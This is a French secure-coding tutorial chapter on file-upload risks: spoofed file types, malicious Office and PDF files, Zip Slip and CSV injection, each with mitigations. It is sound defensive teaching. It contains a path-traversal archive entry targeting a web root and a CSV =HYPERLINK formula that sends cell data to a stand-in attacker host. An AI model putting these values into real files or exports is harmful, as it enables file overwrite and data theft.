---
order: 13
---

# Upload de fichiers : validation, Zip Slip, CSV Injection

Accepter un fichier envoyé par l'utilisateur (photo de profil, justificatif, import de données) ouvre une surface d'attaque à part : contrairement à un champ texte, un fichier a un TYPE, un CONTENU structuré, et une TAILLE, chacun exploitable différemment. Ce chapitre couvre les trois pièges les plus fréquents.

## Valider le type d'un fichier : jamais sur la seule extension

Le nom de fichier et l'en-tête `Content-Type` envoyés par le navigateur lors d'un upload sont des informations fournies par le CLIENT, donc falsifiables comme n'importe quelle autre donnée d'une requête (voir le principe déjà posé dans [Les grandes familles de failles](/?c=securite&s=cybersecurite&p=types-de-failles) : ne jamais faire confiance à une donnée externe sans la valider).

```text
Fichier reellement envoye : script.php renomme en photo.jpg
En-tete Content-Type envoye par le navigateur : image/jpeg   (facilement falsifiable)
Extension du nom de fichier : .jpg                            (juste un nom, pas un contenu)

-> Si le serveur ne verifie QUE l'extension/le Content-Type declare,
   un fichier executable peut se faire passer pour une image
```

| Vérification | Fiabilité | Ce qu'elle empêche |
|---|---|---|
| Extension du nom de fichier | Faible : juste du texte fourni par le client | Rien de garanti seule |
| `Content-Type` déclaré par le navigateur | Faible : également fourni par le client | Rien de garanti seul |
| Signature binaire réelle du fichier (*magic bytes*, premiers octets qui identifient le vrai format) | Fiable : lue dans le contenu, pas déclarée par le client | Un exécutable déguisé en image avec une fausse extension |
| Fichier stocké hors du dossier exécutable par le serveur web | Fiable : même si un fichier malveillant passe malgré tout, il ne peut jamais s'exécuter | Un script uploadé exécuté directement en y accédant par son URL |

> **Piège :** valider uniquement l'extension ou le `Content-Type` déclaré, tous deux fournis par le client donc falsifiables sans effort.
>
> **Bonne pratique :** vérifier la signature binaire réelle du contenu (bibliothèque dédiée du langage utilisé), imposer une taille maximale, et stocker les fichiers uploadés dans un dossier que le serveur web ne sait pas exécuter comme du code, quel que soit le résultat de la validation.

## Fichier tiers spécialisé piégé (PDF, Excel, Word)

Un document Office (`.docx`, `.xlsx`) est en réalité une ARCHIVE zip contenant plusieurs fichiers XML ; un PDF est un format d'objets imbriqués, avec sa propre syntaxe. Traiter un tel fichier (extraction de texte, OCR, conversion) revient à faire confiance à une bibliothèque de parsing SPÉCIALISÉE face à un contenu potentiellement conçu pour l'exploiter, au-delà du simple cas "fichier vide ou tronqué" déjà vu comme cas limite général.

| Risque | Ce qu'il exploite |
|---|---|
| Bombe de décompression interne | Un `.xlsx`/`.docx` est un zip : le même principe qu'une [bombe de décompression classique](/?c=securite&s=cybersecurite&p=surcharge-et-deni-de-service-applicatif) s'applique, dissimulé dans un format qui ne ressemble pas à une archive au premier regard |
| Plantage de la bibliothèque de parsing sur un document malformé | Une bibliothèque de traitement de documents (extraction PDF/OCR, lecture Excel) n'est pas conçue en priorité pour résister à un contenu hostile ; un document délibérément malformé peut la faire planter, voire dans de rares cas révéler un comportement non prévu par ses auteurs |
| Contenu actif (macros, liens externes) | Un document Office peut embarquer une macro exécutable à l'ouverture ; même si votre traitement automatisé n'exécute jamais de macro, un fichier généré à partir d'un document uploadé (aperçu, conversion) qui la conserverait la transmettrait telle quelle à quiconque l'ouvre ensuite |

> **Bonne pratique :** traiter un document uploadé dans un environnement isolé si la bibliothèque de parsing utilisée n'offre pas de garantie forte de robustesse (bac à sable, limite de temps/mémoire d'exécution) ; retirer tout contenu actif (macros) lors d'une conversion plutôt que de le préserver par défaut.

## Zip Slip : un chemin piégé à l'intérieur d'une archive

Une archive (`.zip`, `.tar`) que l'application extrait automatiquement (import en masse, décompression d'un thème, dépôt de fichiers groupés) contient une liste de chemins de fichiers internes, définis par qui a créé l'archive. Un chemin conçu pour remonter hors du dossier de destination prévu peut écrire n'importe où ailleurs sur le disque, si l'extraction ne le vérifie pas.

```text
Contenu attendu d'une entree d'archive :  images/photo.jpg
  -> extrait vers : /var/www/uploads/images/photo.jpg   (dans le dossier prevu)

Entree piegee :  ../../../../var/www/html/backdoor.php
  -> si l'outil d'extraction suit ce chemin tel quel, le fichier est ecrit
     HORS du dossier de destination prevu, potentiellement dans un dossier
     EXECUTABLE par le serveur web
```

Le nom vient de l'idée d'un fichier qui "glisse" (*slip*) hors du dossier cible pendant l'extraction, exactement le même principe que la [traversée de chemin](/?c=securite&s=cybersecurite&p=types-de-failles) appliquée cette fois à chaque entrée d'une archive plutôt qu'à un seul nom de fichier fourni directement.

> **Piège :** extraire une archive uploadée avec la fonction de décompression standard du langage, sans vérifier que chaque chemin d'entrée reste bien contenu dans le dossier de destination prévu.
>
> **Bonne pratique :** avant d'écrire chaque fichier extrait, vérifier que son chemin final résolu reste bien un sous-chemin du dossier de destination (rejeter toute entrée qui contient `..` ou qui résout en dehors), ou utiliser une bibliothèque d'extraction qui applique déjà cette vérification.

## CSV Injection : une formule plutôt qu'une simple donnée

Un fichier `.csv` généré par l'application (export de données, rapport) et destiné à être ouvert dans un tableur (Excel, Google Sheets) porte un risque propre à ce format de destination : le tableur interprète toute cellule commençant par `=`, `+`, `-` ou `@` comme une FORMULE à calculer, pas comme du texte brut.

```text
Donnée utilisateur stockée telle quelle : =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")

Export CSV du champ :  =HYPERLINK("http://attaquant.example/vol?c="&A1;"Cliquez ici")

A l'ouverture du CSV dans Excel : la cellule affiche un lien cliquable "Cliquez ici",
qui envoie en realite le contenu d'une autre cellule (A1) vers un serveur attaquant
des qu'il est clique -- ou pire, certaines formules s'executent SANS meme etre cliquees
```

Ce risque touche n'importe quelle donnée utilisateur exportée telle quelle (pseudo, commentaire, nom de fichier) : rien dans le format CSV lui-même n'échappe ces caractères, c'est uniquement le tableur qui les interprète ainsi à l'ouverture.

> **Piège :** exporter une donnée utilisateur brute dans un CSV, en pensant qu'un fichier CSV "n'est que du texte" et ne peut donc rien exécuter.
>
> **Bonne pratique :** faire précéder d'une apostrophe (`'`) ou d'un espace toute valeur exportée qui commence par `=`, `+`, `-` ou `@`, pour que le tableur l'affiche comme texte brut plutôt que de l'interpréter comme une formule.

---

## 📋 Récapitulatif

| | |
|---|---|
| **À retenir** | Un fichier uploadé porte plusieurs risques distincts d'un champ texte classique : son type déclaré (extension/`Content-Type`) est falsifiable par le client ; un document Office/PDF est un format structuré avec sa propre surface d'attaque ; une archive peut contenir des chemins internes piégés (Zip Slip) ; un export CSV réaffiché dans un tableur peut contenir des formules exécutables (CSV Injection). |
| **Outils utilisables** | Détection de signature binaire réelle (bibliothèque dédiée du langage) ; environnement isolé pour le parsing de documents structurés ; vérification de chemin résolu avant extraction d'archive ; échappement des caractères `=`/`+`/`-`/`@` en tête de cellule CSV. |
| **Pièges à éviter** | Valider un upload sur la seule extension/`Content-Type` déclaré. Traiter un document Office/PDF comme un simple fichier sans surface d'attaque propre. Extraire une archive sans vérifier que chaque chemin reste dans le dossier prévu. Exporter une donnée utilisateur brute dans un CSV. |
| **Bonnes pratiques** | Vérifier la signature binaire réelle, stocker hors d'un dossier exécutable, imposer une taille maximale. Isoler le parsing d'un document structuré (bac à sable, limite de ressources). Rejeter tout chemin d'archive qui sort du dossier de destination. Échapper toute cellule CSV commençant par un caractère de formule. |
